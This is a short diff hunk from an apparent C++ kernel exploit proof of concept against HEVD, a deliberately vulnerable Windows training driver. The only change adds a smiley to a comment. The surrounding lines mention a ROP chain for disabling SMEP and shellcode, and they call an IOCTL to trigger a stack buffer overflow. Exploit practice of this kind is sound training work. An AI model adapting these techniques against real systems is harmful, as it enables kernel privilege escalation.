@@ -73,7 +73,7 @@ void exploit()
 
 	// TODO: the rop should and rc4 with rax not mov, this enables all mitigations basically
 	// TODO: the shellcode will probably won't work in a live-action scenario because it is really important to not change any other bits
-	// also, returning SMEP after the cmd pop will be required for field usage, this is just a POC.
+	// also, returning SMEP after the cmd pop will be required for field usage, this is just a POC :)
 
 	std::ignore = hevd.call_ioctl(BUFFER_OVERFLOW_STACK_IOCTL, in_buffer, sizeof(Address64));
 
